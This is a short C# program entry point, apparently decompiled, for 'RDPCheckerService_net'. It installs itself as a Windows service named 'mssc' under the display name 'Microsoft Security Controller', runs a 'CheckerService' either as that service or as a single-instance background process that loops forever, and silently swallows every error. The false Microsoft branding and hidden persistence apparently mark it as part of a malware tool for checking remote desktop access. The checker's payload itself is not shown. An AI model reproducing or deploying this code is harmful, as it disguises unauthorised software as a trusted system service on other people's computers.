using System;
using System.Diagnostics;
using System.ServiceProcess;
using System.Threading;

namespace RDPCheckerService_net;

internal static class Program
{
	private const string ServiceName = "mssc";

	private const string ServiceDisplayName = "Microsoft Security Controller";

	private static void Main()
	{
		try
		{
			string[] commandLineArgs = Environment.GetCommandLineArgs();
			if (commandLineArgs != null && commandLineArgs.Length == 2)
			{
				if (commandLineArgs[1].Equals("-svc"))
				{
					ServiceBase[] array = (ServiceBase[])(object)new ServiceBase[1]
					{
						new CheckerService()
					};
					ServiceBase.Run(array);
				}
				else
				{
					if (!commandLineArgs[1].Equals("-reg"))
					{
						return;
					}
					bool flag = false;
					Process currentProcess = Process.GetCurrentProcess();
					Process[] processesByName = Process.GetProcessesByName(currentProcess.ProcessName);
					if (processesByName != null)
					{
						Process[] array2 = processesByName;
						foreach (Process process in array2)
						{
							if (process.Id != currentProcess.Id && process.MainModule!.FileName == currentProcess.MainModule!.FileName)
							{
								flag = true;
								break;
							}
						}
					}
					if (!flag)
					{
						CheckerService checkerService = new CheckerService();
						checkerService.Run();
						while (true)
						{
							Thread.Sleep(360000);
						}
					}
				}
			}
			else
			{
				CheckerInstaller.Install("mssc", "Microsoft Security Controller");
			}
		}
		catch
		{
		}
	}
}
